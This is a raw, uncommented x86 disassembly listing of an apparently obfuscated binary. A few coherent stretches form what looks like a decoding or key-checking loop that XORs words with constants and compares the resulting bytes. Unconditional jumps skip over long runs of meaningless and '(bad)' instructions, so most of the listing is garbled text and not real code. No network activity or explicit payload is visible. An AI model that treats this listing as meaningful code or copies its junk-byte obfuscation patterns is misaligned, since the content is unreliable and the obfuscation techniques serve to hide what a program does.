  40495b:	cdq    
  40495c:	cmp    eax,0x18768ac
  404961:	sub    dh,BYTE PTR [ecx]
  404963:	sbb    al,0x98
  404965:	les    edi,FWORD PTR [eax+0x77]
  404968:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40496a:	(bad)  
  40496b:	call   0xd53c60a3
  404970:	lods   eax,DWORD PTR ds:[esi]
  404971:	xor    BYTE PTR [eax+0x2b],bh
  404974:	push   ecx
  404975:	dec    ecx
  404976:	cmp    DWORD PTR [ecx-0x12709541],edi
  40497c:	jne    0x4049d2
  40497e:	xchg   edx,eax
  40497f:	mov    dh,0xd
  404981:	cmp    al,0x9c
  404983:	in     al,0x6b
  404985:	jle    0x40492e
  404987:	arpl   WORD PTR [edx],sp
  404989:	in     eax,0x70
  40498b:	scas   al,BYTE PTR es:[edi]
  40498c:	mov    BYTE PTR [ecx-0x18],0x85
  404990:	cmp    al,0x7a
  404992:	dec    ebx
  404993:	sbb    DWORD PTR [edi],ebp
  404995:	idiv   DWORD PTR [edi+0x5fe8ff76]
  40499b:	(bad)  
  40499c:	ficomp WORD PTR [edi+ebx*1]
  40499f:	shl    BYTE PTR [esi],cl
  4049a1:	iret   
  4049a2:	push   es
  4049a3:	xor    BYTE PTR [ecx+0x553c0c87],0x3c
  4049aa:	sub    DWORD PTR [edi],ecx
  4049ac:	dec    edi
  4049ad:	cli    
  4049ae:	xchg   ebp,eax
  4049af:	aas    
  4049b0:	or     DWORD PTR [edi],ebp
  4049b2:	cmp    al,al
  4049b4:	hlt    
  4049b5:	cmp    esp,DWORD PTR [esi-0x52]
  4049b8:	daa    
  4049b9:	imul   ecx,esi,0xffffff9e
  4049bc:	int    0xd9
  4049be:	mov    esi,?
  4049c0:	cmp    al,0xdb
  4049c2:	sub    edx,DWORD PTR [eax]
  4049c4:	and    al,0xac
  4049c6:	mov    ecx,0xe82136ea
  4049cb:	es jge 0x404a1e
  4049ce:	push   edx
  4049cf:	push   0x61
  4049d1:	mov    edi,0x3b8a4d1c
  4049d6:	push   ebx
  4049d7:	bound  edi,QWORD PTR ds:0xed16385f
  4049dd:	inc    eax
  4049de:	pop    eax
  4049df:	push   edi
  4049e0:	mov    edi,DWORD PTR [ebp+0x8]
  4049e3:	sbb    DWORD PTR ds:0x43371b,ebx
  4049e9:	mov    eax,0x8a3a
  4049ee:	xor    DWORD PTR ds:0x4336b3,0x2227
  4049f8:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4049fd:	movzx  edi,WORD PTR ds:0x433653
  404a04:	sbb    DWORD PTR ds:0x4336f3,edi
  404a0a:	mov    edi,0x3b00
  404a0f:	add    DWORD PTR ds:0x433723,0x4336f3
  404a19:	add    ax,di
  404a1c:	movzx  eax,ax
  404a1f:	mov    DWORD PTR [ebp-0x14],eax
  404a22:	mov    eax,DWORD PTR [ebp+0x8]
  404a25:	movzx  eax,WORD PTR [eax+edx*4]
  404a29:	xor    eax,0x8a3a
  404a2e:	xor    DWORD PTR ds:0x433733,0x619a
  404a38:	add    eax,edi
  404a3a:	mov    edi,DWORD PTR [ebp-0x14]
  404a3d:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404a41:	mov    eax,DWORD PTR [ebp-0xc]
  404a44:	inc    edx
  404a45:	cmp    edx,eax
  404a47:	jne    0x4049e0
  404a4d:	pop    edi
  404a4e:	pop    ebx
  404a4f:	mov    eax,DWORD PTR [ebp-0x8]
  404a52:	mov    edx,DWORD PTR [ebp+0x10]
  404a55:	xor    eax,ecx
  404a57:	add    eax,esi
  404a59:	mov    DWORD PTR [edx],eax
  404a5b:	mov    eax,DWORD PTR [ebp-0x8]
  404a5e:	jmp    0x404c30
  404a63:	das    
  404a64:	or     DWORD PTR [eax-0x16825d93],eax
  404a6a:	pop    ebp
  404a6b:	out    0xe3,al
  404a6d:	sub    ecx,DWORD PTR [ebx+0x3e]
  404a70:	pushf  
  404a71:	push   cs
  404a72:	rol    DWORD PTR [ebp+ebp*1+0x7fab7c7c],0x7c
  404a7a:	jl     0x404ad2
  404a7c:	push   0x6d
  404a7e:	push   DWORD PTR [ebx+0x5df59d8e]
  404a84:	jg     0x404ac0
  404a86:	pop    eax
  404a87:	dec    ecx
  404a88:	out    0xa2,eax
  404a8a:	jp     0x404aa6
  404a8c:	mov    ecx,0xefe2c1f0
  404a91:	imul   eax,DWORD PTR [ecx+0x6f4f5f9d],0x8f5398a
  404a9b:	cs mov dl,0x2f
  404a9e:	arpl   WORD PTR ds:0x28ff1b97,dx
  404aa4:	imul   DWORD PTR [ebx-0x6e2b50db]
  404aaa:	and    al,al
  404aac:	aad    0x9e
  404aae:	dec    esp
  404aaf:	mov    ebx,0x2b69c4b
  404ab4:	mov    edx,0x3ff0b85
  404ab9:	maskmovq mm5,(bad)
  404aba:	imul   DWORD PTR [ebp-0x2e]
  404abd:	mov    esp,0x9a50182b
  404ac2:	sub    al,0x6b
  404ac4:	push   ecx
  404ac5:	dec    ecx
  404ac6:	cmp    al,dl
  404ac8:	je     0x404ade
  404aca:	in     al,0x9c
  404acc:	xor    DWORD PTR ds:0x197e96de,edi
  404ad2:	ja     0x404b1c
  404ad4:	pop    ebx
  404ad5:	ja     0x404b06
  404ad7:	outs   dx,DWORD PTR ds:[esi]
  404ad8:	test   eax,0x5bbde2ec
  404add:	and    dh,BYTE PTR [ebx+ebp*8-0x14acc46]
  404ae4:	mov    bh,0x31
  404ae6:	xchg   ebx,eax
  404ae7:	add    al,BYTE PTR [eax+0x18ee4a7f]
  404aed:	dec    eax
  404aee:	and    bh,BYTE PTR [edi]
  404af0:	add    bh,BYTE PTR [ebp+0x20]
  404af3:	(bad)  
  404af4:	ss out dx,eax
  404af6:	imul   ebx,DWORD PTR [ecx+0x2623d44a],0x11
  404afd:	xchg   ecx,eax
  404afe:	pop    ss
  404aff:	xor    BYTE PTR [eax+0x7d],bl
  404b02:	jbe    0x404b2b
  404b04:	adc    BYTE PTR [ebx-0x5c],bl
  404b07:	aaa    
  404b08:	mov    ds:0xf1a74241,eax
  404b0d:	push   ebp
  404b0e:	jge    0x404afb
  404b10:	aaa    
  404b11:	mov    al,0x53
  404b13:	ror    BYTE PTR [edx],1
  404b15:	xor    DWORD PTR [edi],0x2ed503a0
  404b1b:	popf   
  404b1c:	sub    BYTE PTR [ebx-0x65],bh
  404b1f:	pop    ecx
  404b20:	add    bl,0x59
  404b23:	sub    eax,0xffd69b4f
  404b28:	sub    bl,dl
  404b2a:	mov    edi,0x250e98d6
  404b2f:	xchg   edx,eax
  404b30:	adc    ebx,0x70046584
  404b36:	hlt    
  404b37:	mov    ds:0x52231f80,eax
  404b3c:	jmp    0x52a5:0x2d84d8a
  404b43:	sbb    al,0x3f
  404b45:	jnp    0x404b5a
  404b47:	out    dx,al
  404b48:	stos   BYTE PTR es:[edi],al
  404b49:	call   0x5b70b3cd
  404b4e:	fyl2xp1 
  404b50:	sar    DWORD PTR [esi+0x42],0x23
  404b54:	cs jb  0x404b01
  404b57:	sub    ebp,0xcd64fa
  404b5d:	fldcw  WORD PTR [ecx]
  404b5f:	fild   QWORD PTR [eax+0x6f8aa468]
  404b65:	mov    ebx,0xa75752d3
  404b6a:	cld    
  404b6b:	(bad)  
  404b6c:	(bad)  
  404b6e:	(bad)  
  404b71:	mov    bh,0x60
  404b73:	outs   dx,BYTE PTR ds:[esi]
  404b74:	or     BYTE PTR [edx+edi*8-0x3147d654],ah
  404b7b:	inc    eax
  404b7c:	mov    ecx,0xee11332
  404b81:	sti    
  404b82:	(bad)  
  404b83:	addr16 mov esi,0x1eff1b16
  404b89:	aas    
  404b8a:	and    DWORD PTR ds:0x1fccb99,ebx
  404b90:	inc    edi
  404b91:	imul   esi,DWORD PTR [edi+0x2af6fc38],0x6d
  404b98:	iret   
  404b99:	shr    BYTE PTR [esi+0x33],1
  404b9c:	jmp    0x21b3:0xa1378e08
  404ba3:	mov    ecx,0x79383725
  404ba8:	call   0xbc1e:0xd407938d
  404baf:	fisub  DWORD PTR [eax-0x3f260215]
  404bb5:	das    
  404bb6:	add    al,0x57
  404bb8:	mov    ebx,0xba176be6
  404bbd:	loope  0x404b89
  404bbf:	(bad)  
  404bc0:	std    
  404bc1:	mov    dl,0xe0
  404bc3:	xor    BYTE PTR [esp-0x3d],bl
  404bc7:	ror    DWORD PTR [edx],1
  404bc9:	jns    0x404b73
  404bcb:	pop    eax
  404bcc:	inc    ecx
  404bcd:	mov    WORD PTR [edx-0x1230065f],fs
  404bd3:	stc    
  404bd4:	push   esi
  404bd5:	cmp    BYTE PTR [esi+0xaf84442],0x93
  404bdc:	cdq    
  404bdd:	adc    BYTE PTR [edx-0x24],bh
  404be0:	(bad)  
  404be1:	aam    0x3d
  404be3:	xchg   BYTE PTR [edi-0x44430279],cl
  404be9:	push   ss
  404bea:	add    eax,0x7bf8bbf0
  404bef:	cmp    eax,0xa078ca58
  404bf4:	les    edx,FWORD PTR [edx+0x5d72fee]
  404bfa:	cld    
  404bfb:	hlt    
  404bfc:	int    0x40
  404bfe:	adc    dh,BYTE PTR [edi-0x7a]
  404c01:	adc    esi,DWORD PTR [ebp-0x40fe3d3c]
  404c07:	out    0x7f,al
  404c09:	cmp    eax,0x6944a86d
  404c0e:	inc    eax
  404c0f:	ss or  eax,0xd685d482
  404c15:	add    dl,BYTE PTR [ecx+esi*2]
  404c18:	ja     0x404bf9
  404c1a:	int3   
  404c1b:	sbb    ch,al
  404c1d:	xor    BYTE PTR [edx],dl
  404c1f:	xchg   ebx,eax
  404c20:	scas   al,BYTE PTR es:[edi]
  404c21:	neg    BYTE PTR [eax-0x48dc9663]
  404c27:	cld    
  404c28:	sbb    BYTE PTR [esi+0x3af516d2],dl
  404c2e:	xor    eax,DWORD PTR [ebx]
  404c30:	xor    eax,ecx
  404c32:	add    eax,esi
  404c34:	mov    DWORD PTR [ebp+0x8],eax
  404c37:	mov    eax,DWORD PTR [ebp+0x8]
  404c3a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404c3e:	mov    dl,BYTE PTR [ebp-0x1]
  404c41:	cmp    al,dl
  404c43:	je     0x40502a
  404c49:	mov    eax,DWORD PTR [ebp+0x8]
  404c4c:	jmp    0x404e1e
  404c51:	adc    al,0xc9
  404c53:	mulps  xmm2,xmm1
  404c56:	pop    ecx
  404c57:	jbe    0x404cca
  404c59:	sti    
  404c5a:	lahf   
  404c5b:	dec    ecx
  404c5c:	xchg   ebx,eax
  404c5d:	int3   
  404c5e:	jnp    0x404c57
  404c60:	pop    edi
  404c61:	xor    ebp,DWORD PTR [edi]
  404c63:	jl     0x404ce1
  404c65:	stos   DWORD PTR es:[edi],eax
  404c66:	jg     0x404ce4
  404c68:	jl     0x404cbc
  404c6a:	sub    ah,BYTE PTR [edx]
  404c6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c6d:	adc    ebx,DWORD PTR [ebp+0xe]
  404c70:	dec    ecx
  404c71:	pusha  
  404c72:	xor    edx,DWORD PTR [edi-0x2b]
  404c75:	mov    ds:0x955e0ec1,al
  404c7a:	rol    bh,cl
  404c7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c7d:	add    dl,cl
  404c7f:	jns    0x404c2c
  404c81:	into   
  404c82:	dec    edx
  404c83:	sti    
  404c84:	es jle 0x404c70
  404c87:	hlt    
  404c88:	out    dx,eax
  404c89:	sub    BYTE PTR [edi-0x272c2a9],cl
  404c8f:	sub    eax,0x574dcaca
  404c94:	popa   
  404c95:	push   edi
  404c96:	retfw  
  404c98:	adc    bh,BYTE PTR [eax+ecx*4]
  404c9b:	daa    
  404c9c:	ins    DWORD PTR es:[edi],dx
  404c9d:	cmp    DWORD PTR [eax-0x4d],edx
  404ca0:	push   esi
  404ca1:	mov    ebp,0x444e9987
  404ca6:	out    0x61,al
  404ca8:	js     0x404ce4
  404caa:	inc    edx
  404cab:	fadd   QWORD PTR [ebx-0x5cd8fa8f]
  404cb1:	xabort 0xb9
  404cb4:	ret    0x41cf
  404cb7:	lahf   
  404cb8:	push   0xffffff84
  404cba:	mov    edx,0x613118eb
  404cbf:	test   DWORD PTR [ebx+eax*2-0x3141f614],edi
  404cc6:	out    0x6d,eax
  404cc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cc9:	es cmc 
  404ccb:	sbb    DWORD PTR [eax-0x6d],edx
  404cce:	(bad)  
  404ccf:	call   0x1b452cde
  404cd4:	xchg   edi,eax
  404cd5:	and    ebx,DWORD PTR [eax+ebp*8+0x15a81542]
  404cdc:	fwait
  404cdd:	jns    0x404c8d
  404cdf:	sbb    DWORD PTR [esi+eiz*2],esi
  404ce2:	mov    al,0xfb
  404ce4:	xchg   BYTE PTR [esi-0x1e2cfb7e],bh
  404cea:	mov    edx,0xea4ee3a7
  404cef:	adc    al,0x80
  404cf1:	fld    st(3)
  404cf3:	inc    esp
  404cf4:	add    eax,0x6a5519ac
  404cf9:	and    eax,DWORD PTR [edx+edi*4-0x2002338]
  404d00:	shl    ebx,0x22
  404d03:	out    dx,eax
  404d04:	lock jb 0x404caa
  404d07:	dec    ecx
  404d08:	add    DWORD PTR [ebp+0xb],ebx
  404d0b:	sbb    ebp,DWORD PTR ds:0xc7d2cbfc
  404d11:	sbb    eax,0xd29df831
  404d16:	mov    ebp,0x184ef0d8
  404d1b:	daa    
  404d1c:	mov    eax,ds:0xd3cfb058
  404d21:	fcmove st,st(4)
  404d23:	or     eax,0xbdc895ce
  404d28:	jne    0x404d28
  404d2a:	xchg   cl,ah
  404d2c:	add    bh,BYTE PTR [esi-0x4f]
  404d2f:	jae    0x404d67
  404d31:	mov    ecx,0x90cd2d25
  404d36:	lods   al,BYTE PTR ds:[esi]
  404d37:	addr16 jae 0x404ccb
  404d3a:	inc    esi
  404d3b:	scas   eax,DWORD PTR es:[edi]
  404d3c:	bound  ecx,QWORD PTR [ecx+0x2]
  404d3f:	addr16 jo 0x404cc8
  404d42:	push   ebx
  404d43:	loope  0x404d70
  404d45:	popf   
  404d46:	dec    ebp
  404d47:	test   al,0xba
  404d49:	sbb    ebp,DWORD PTR [ebp+0x9]
  404d4c:	(bad)  
  404d4d:	nop
  404d4e:	add    bl,BYTE PTR [ebx-0x18]
  404d51:	jle    0x404d8c
  404d53:	or     al,0x3
  404d55:	fsub   st(6),st
  404d57:	mov    cl,0x6c
  404d59:	mov    WORD PTR [ebp+0x4],ds
  404d5c:	popa   
  404d5d:	sub    edi,DWORD PTR [ecx]
  404d5f:	sbb    al,0xee
  404d61:	mov    ch,0xc1
  404d63:	jge    0x404db1
  404d65:	fwait
  404d66:	lahf   
  404d67:	(bad)  
  404d68:	jb     0x404d7d
  404d6a:	adc    bl,BYTE PTR gs:[eax]
  404d6d:	pop    ecx
  404d6e:	les    esp,FWORD PTR [ecx-0x2b]
  404d71:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  404d73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d74:	aam    0xf3
  404d76:	fld    DWORD PTR [esi-0x6fa999a0]
  404d7c:	xchg   DWORD PTR [edi],esi
  404d7e:	(bad)  
  404d7f:	push   esp
  404d80:	ret    
  404d81:	jge    0x404d1e
  404d83:	jne    0x404d6d
  404d85:	push   0xffffffef
  404d87:	jb     0x404d14
  404d89:	iret   
  404d8a:	push   ebx
  404d8b:	cld    
  404d8c:	js     0x404d3f
  404d8e:	dec    edx
  404d8f:	or     eax,edi
  404d91:	sub    bl,bh
  404d93:	add    edx,DWORD PTR [ebp-0xe957d85]
  404d99:	push   esi
  404d9a:	aad    0x62
  404d9c:	(bad)  
  404d9d:	(bad)  
  404d9e:	fcomp  QWORD PTR [eax+0x30]
  404da1:	xchg   edx,eax
  404da2:	int3   
  404da3:	loopne 0x404d4a
  404da5:	pop    ebx
  404da6:	jae    0x404d98
  404da8:	pop    edx
  404da9:	imul   esp,esp,0xf832f775
  404daf:	push   ebp
  404db0:	mov    esp,0xa3e17b68
  404db5:	mov    al,0x65
  404db7:	test   DWORD PTR [esi+0x55],ebx
  404dba:	push   esp
  404dbb:	inc    ecx
  404dbc:	aam    0xeb
  404dbe:	idiv   BYTE PTR [edx+0x30]
  404dc1:	test   DWORD PTR [ebx],esp
  404dc3:	mov    eax,0x1262454d
  404dc8:	mov    ?,WORD PTR [esi]
  404dca:	shr    edx,1
  404dcc:	push   eax
  404dcd:	jno    0x404d5b
  404dcf:	or     bh,BYTE PTR [edi]
  404dd1:	in     eax,dx
  404dd2:	sub    ecx,DWORD PTR [edx+0x30]
  404dd5:	cmp    BYTE PTR [esi+edx*4],dh
  404dd8:	or     DWORD PTR [esi-0x5b],ebp
  404ddb:	sub    edx,eax
  404ddd:	pushf  
  404dde:	pop    edi
  404ddf:	popa   
  404de0:	(bad)  
  404de1:	into   
  404de2:	out    dx,eax
  404de3:	das    
  404de4:	adc    eax,0x22e70153
  404de9:	add    DWORD PTR [ecx+0x38],ebx
  404dec:	daa    
  404ded:	pushf  
  404dee:	and    bl,BYTE PTR [ecx+0x1455a856]
  404df4:	shl    BYTE PTR [ebx-0x3b9122d9],0x3d
  404dfb:	jmp    0x978e08ba
  404e00:	mov    eax,0xb3ae1b7
  404e05:	xchg   BYTE PTR ds:0xe1192d3e,bl
  404e0b:	cmp    DWORD PTR [ebx],ecx
  404e0d:	pop    ss
  404e0e:	(bad)  
  404e0f:	arpl   dx,ax
  404e11:	add    eax,0x499ac366
  404e16:	inc    edx
  404e17:	int    0x71
  404e19:	jle    0x404e3b
  404e1b:	xchg   ebx,eax
  404e1c:	test   BYTE PTR [esi-0x57fabb76],dl
  404e22:	mov    edx,DWORD PTR [ebp+0xc]
  404e25:	cmp    al,BYTE PTR [edx]
  404e27:	jne    0x405222
  404e2d:	mov    eax,DWORD PTR [ebp-0x8]
  404e30:	mov    edx,DWORD PTR [ebp+0xc]
  404e33:	movsx  edx,BYTE PTR [edx]
  404e36:	xor    eax,ecx
  404e38:	jmp    0x40500a
  404e3d:	test   BYTE PTR [ecx-0x28a15a6],dh
  404e43:	xchg   esp,eax
  404e44:	jge    0x404e3a
  404e46:	int    0x4b
  404e48:	add    eax,0x5306e42
  404e4d:	outs   dx,BYTE PTR ds:[esi]
  404e4e:	cs jl  0x404ecd
  404e51:	stos   DWORD PTR es:[edi],eax
  404e52:	jg     0x404ed0
  404e54:	jl     0x404e5e
  404e56:	les    eax,FWORD PTR [ebp-0x1645d990]
  404e5c:	ror    BYTE PTR [ebx],1
  404e5e:	sub    eax,0xd4e70430
  404e63:	fndisi(8087 only) 
  404e65:	xlat   BYTE PTR ds:[ebx]
  404e66:	mov    bh,0xc6
  404e68:	rcr    BYTE PTR [esi],1
  404e6a:	call   0xc2613c9b
  404e6f:	jmp    FWORD PTR [eax-0x6d]
  404e72:	mov    al,0x32
  404e74:	pop    ecx
  404e75:	mov    cl,0x66
  404e77:	jmp    0xf428eb5b
  404e7c:	push   ecx
  404e7d:	in     al,0x27
  404e7f:	xchg   BYTE PTR [edx-0x60743605],cl
  404e85:	adc    BYTE PTR [edi+esi*8],bl
  404e88:	ret    
  404e89:	dec    eax
  404e8a:	das    
  404e8b:	jl     0x404e5f
  404e8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e8e:	int    0xbf
  404e90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e91:	cmp    al,0xe1
  404e93:	lods   eax,DWORD PTR ds:[esi]
  404e94:	push   ss
  404e95:	push   ss
  404e96:	shr    DWORD PTR ds:0x4104c8e6,0x8d
  404e9d:	stos   DWORD PTR es:[edi],eax
  404e9e:	pop    ebx
  404e9f:	arpl   WORD PTR [ebp+0x72ca9f44],cx
  404ea5:	xchg   ebp,eax
  404ea6:	sub    ebp,DWORD PTR [ecx]
  404ea8:	clc    
  404ea9:	sbb    edi,edi
  404eab:	adc    eax,0x1ea81b8f
  404eb0:	retf   0x4880
  404eb3:	jo     0x404e7e
  404eb5:	test   ebx,edi
  404eb7:	mov    cl,0xa8
  404eb9:	ins    BYTE PTR es:[edi],dx
  404eba:	or     eax,DWORD PTR [ecx]
  404ebc:	leave  
  404ebd:	div    BYTE PTR [edx+0x52]
  404ec0:	sbb    ebx,eax
  404ec2:	stc    
  404ec3:	dec    esi
  404ec4:	xchg   esi,eax
  404ec5:	mov    DWORD PTR [ecx+0x7b],0x1a4147fc
  404ecc:	and    eax,edx
  404ece:	mov    ch,0xf6
  404ed0:	jb     0x404f49
  404ed2:	call   0xf5:0x7b45ba5
  404ed9:	dec    esp
  404eda:	lock popf 
  404edc:	cld    
  404edd:	call   0x13243baa
  404ee2:	mov    al,0x71
  404ee4:	stos   DWORD PTR es:[edi],eax
  404ee5:	in     eax,0x1c
  404ee7:	(bad)  
  404ee8:	sbb    eax,0x3226fc5
  404eed:	sbb    ebx,ecx
  404eef:	add    ebx,DWORD PTR [esi-0x1174c08e]
  404ef5:	ret    
  404ef6:	scas   eax,DWORD PTR es:[edi]
  404ef7:	push   edi
  404ef8:	je     0x404f4a
  404efa:	xor    al,ah
  404efc:	inc    ecx
  404efd:	mov    esp,0x17532c9c
  404f02:	test   DWORD PTR [ebp+0x4b6459b8],esp
  404f08:	adc    BYTE PTR [ebx],0xf5
  404f0b:	je     0x404f64
  404f0d:	pusha  
  404f0e:	adc    DWORD PTR [ecx+ebp*1+0x41dc982],esp
  404f15:	mov    dh,0xf7
  404f17:	cmp    al,0x2e
  404f19:	mov    ds:0x4b64428e,al
  404f1e:	not    DWORD PTR [edx+ecx*8+0x50e85d8]
  404f25:	inc    ebp
  404f26:	outs   dx,DWORD PTR ds:[esi]
  404f27:	adc    eax,0xdf65d106
  404f2c:	out    0x5b,al
  404f2e:	dec    ebp
  404f2f:	sbb    eax,DWORD PTR [ecx+eax*4-0x18]
  404f33:	sti    
  404f34:	(bad)  
  404f35:	or     ecx,ebp
  404f37:	jno    0x404fac
  404f39:	add    al,0xcd
  404f3b:	xlat   BYTE PTR ds:[ebx]
  404f3c:	push   esi
  404f3d:	jg     0x404ed5
  404f3f:	daa    
  404f40:	fmul   DWORD PTR [edx-0x52871efb]
  404f46:	xchg   BYTE PTR [edx],dl
  404f48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f49:	jp     0x404ef1
  404f4b:	xchg   ebp,eax
  404f4c:	ins    DWORD PTR es:[edi],dx
  404f4d:	and    BYTE PTR [edx+0x25b739aa],ch
  404f53:	scas   al,BYTE PTR es:[edi]
  404f54:	dec    ecx
  404f55:	stos   BYTE PTR es:[edi],al
  404f56:	and    eax,0xc4ed9c55
  404f5b:	and    eax,0xf4dd3644
  404f60:	inc    ebx
  404f61:	fisttp WORD PTR [ecx]
  404f63:	xchg   esi,eax
  404f64:	aam    0xbf
  404f66:	dec    ecx
  404f67:	jnp    0x404fd2
  404f69:	add    esp,DWORD PTR [ebp-0x64]
  404f6c:	es stc 
  404f6e:	adc    DWORD PTR [ecx],esi
  404f70:	and    cl,BYTE PTR [ecx+edi*4]
  404f73:	stc    
  404f74:	aas    
  404f75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f76:	push   eax
  404f77:	in     al,0xc0
  404f79:	add    al,0x2
  404f7b:	push   eax
  404f7c:	push   ecx
  404f7d:	jp     0x404f60
  404f7f:	out    dx,al
  404f80:	dec    DWORD PTR [edi-0x166c7ae2]
  404f86:	xchg   BYTE PTR [edi+esi*8],ah
  404f89:	fcomp  st(1)
  404f8b:	and    ecx,edi
  404f8d:	lods   eax,DWORD PTR ds:[esi]
  404f8e:	inc    esi
  404f8f:	xchg   esi,eax
  404f90:	push   0xa5c9b03f
  404f95:	cmc    
  404f96:	dec    esi
  404f97:	mov    bh,0x6c
  404f99:	add    esi,DWORD PTR [edx-0x19]
  404f9c:	dec    esp
  404f9d:	push   0x9
  404f9f:	loopne 0x404f4f
  404fa1:	ret    0x5e39
  404fa4:	int3   
  404fa5:	or     edi,ebx
  404fa7:	add    al,0x79
  404fa9:	fdiv   DWORD PTR ds:0x543df79a
  404faf:	out    dx,al
  404fb0:	mov    edx,0xdbf821ed
  404fb5:	jns    0x404f82
  404fb7:	aas    
  404fb8:	mov    ebx,0x5b0314d
  404fbd:	adc    eax,ebx
  404fbf:	xchg   dl,dh
  404fc1:	rol    BYTE PTR [ebx+0x55b38f7d],cl
  404fc7:	int3   
  404fc8:	and    al,0xd7
  404fca:	sub    eax,edi
  404fcc:	lods   eax,DWORD PTR ds:[esi]
  404fcd:	jb     0x404f90
  404fcf:	sub    eax,0x3b3a6a2c
  404fd4:	add    eax,DWORD PTR [edi]
  404fd6:	and    BYTE PTR [esi+0x1ee34e2],cl
  404fdc:	sar    ah,cl
  404fde:	call   0x19a986d4
  404fe3:	mov    eax,ds:0x61e481e0
  404fe8:	cwde   
  404fe9:	fld    DWORD PTR [ecx+0x76b54556]
  404fef:	mov    bh,0x99
  404ff1:	mov    DWORD PTR [esp+edx*2-0x54419d49],edx
  404ff8:	and    ah,dh
  404ffa:	sub    eax,0x7a4b1a1b
  404fff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405000:	and    eax,0x54736c2b
  405005:	mov    edx,0x447c8ae8
  40500a:	add    eax,esi
  40500c:	cmp    edx,eax
  40500e:	je     0x405216
  405014:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  40501b:	lea    eax,[ebp-0x18]
  40501e:	mov    DWORD PTR [ebp-0x14],eax
  405021:	mov    eax,DWORD PTR [ebp-0x14]
  405024:	add    DWORD PTR [eax],0x705fa8f
  40502a:	mov    eax,DWORD PTR [ebp-0x10]
  40502d:	mov    edx,DWORD PTR [ebp+0x8]
  405030:	xor    eax,ecx
  405032:	jmp    0x405204
  405037:	das    
  405038:	dec    ebx
  405039:	sbb    al,0x9b
  40503b:	pop    eax
  40503c:	imul   ebp,DWORD PTR [ebx-0x6bdfc3b5],0xfffffff0
  405043:	push   esi
  405044:	stos   DWORD PTR es:[edi],eax
  405045:	add    bh,bh
  405047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405048:	sub    BYTE PTR [esp+edi*2-0x55],bh
  40504c:	jg     0x4050ca
  40504e:	jl     0x405064
  405050:	inc    edx
  405051:	add    DWORD PTR [ecx-0x33],0xffffffa5
  405055:	jns    0x405050
  405057:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405058:	mov    ecx,0x233f0b06
  40505d:	sbb    al,BYTE PTR [edx+0x4b]
  405060:	out    dx,eax
  405061:	loop   0x405010
  405063:	jg     0x40500d
  405065:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405066:	mov    esp,0xa3f06903
  40506b:	test   eax,0x27609a9b
  405070:	js     0x405028
  405072:	pop    ds
  405073:	cmp    eax,0xd159b25
  405078:	mov    DWORD PTR [ebx+0x69],ecx
  40507b:	mov    ah,0x9f
  40507d:	pop    es
  40507e:	xchg   ecx,eax
  40507f:	outs   dx,BYTE PTR ds:[esi]
  405080:	mov    bl,0x75
  405082:	xchg   ah,bl
  405084:	mov    cs,WORD PTR [ecx+ebx*4]
  405087:	xor    al,0xdf
  405089:	fisub  DWORD PTR [esi+eiz*1]
  40508c:	dec    esp
  40508d:	mov    ecx,0x8ead9a40
  405092:	lods   eax,DWORD PTR ds:[esi]
  405093:	push   ebp
  405094:	dec    edi
  405095:	lods   eax,DWORD PTR ds:[esi]
  405096:	jne    0x405053
  405098:	mov    dh,0x1c
  40509a:	loop   0x4050fe
  40509c:	push   ss
  40509d:	ret    0x5d4a
  4050a0:	xor    al,0xd9
  4050a2:	scas   al,BYTE PTR es:[edi]
  4050a3:	loop   0x40508b
  4050a5:	add    DWORD PTR [esp+eax*2+0x5a50fa0d],ebp
  4050ac:	enter  0x63c,0xa2
  4050b0:	xchg   ecx,eax
  4050b1:	jnp    0x405072
  4050b3:	jnp    0x4050c6
  4050b5:	outs   dx,DWORD PTR ds:[esi]
  4050b6:	mov    bh,0x57
  4050b8:	mov    eax,ds:0xc0b17a96
  4050bd:	or     ecx,esp
  4050bf:	lds    esi,FWORD PTR [ebx-0x6d]
  4050c2:	iret   
  4050c3:	(bad)  
  4050c4:	jo     0x405062
  4050c6:	mov    dh,0x6b
  4050c8:	jmp    0x53acd059
  4050cd:	cld    
  4050ce:	add    al,0x33
  4050d0:	cmc    
  4050d1:	dec    eax
  4050d2:	pop    edx
  4050d3:	ror    BYTE PTR [esi-0x5c8f5fbe],1
  4050d9:	popf   
  4050da:	cmp    DWORD PTR [ebx+0x66],esi
  4050dd:	push   esp
  4050de:	loopne 0x405155
  4050e0:	jp     0x4050ba
  4050e2:	outs   dx,BYTE PTR ds:[esi]
  4050e3:	sbb    eax,0x78a801eb
  4050e8:	mov    edx,0x5f367cb3
  4050ed:	xor    al,0x7a
  4050ef:	clc    
  4050f0:	mov    dl,0x37
  4050f2:	mov    ah,0xad
  4050f4:	jno    0x405113
  4050f6:	dec    ecx
  4050f7:	in     al,0xb3
  4050f9:	call   0x9ef8:0x4aa12ac3
  405100:	push   ebp
  405101:	dec    esp
  405102:	stc    
  405103:	retf   0x4591
  405106:	dec    ebx
  405107:	pop    eax
  405108:	xlat   BYTE PTR ds:[ebx]
  405109:	mov    ds:0xdc23697,eax
  40510e:	outs   dx,BYTE PTR ds:[esi]
  40510f:	adc    bl,BYTE PTR [esi+0x19d2d830]
  405115:	(bad)  
  405116:	cld    
  405117:	arpl   cx,sp
  405119:	cs mov cl,0x39
  40511c:	sbb    DWORD PTR [ecx],0xa2b23f20
  405122:	sti    
  405123:	jg     0x405172
  405125:	pushf  
  405126:	push   es
  405127:	mov    bh,0x3c
  405129:	dec    ebp
  40512a:	popf   
  40512b:	push   eax
  40512c:	js     0x4050e3
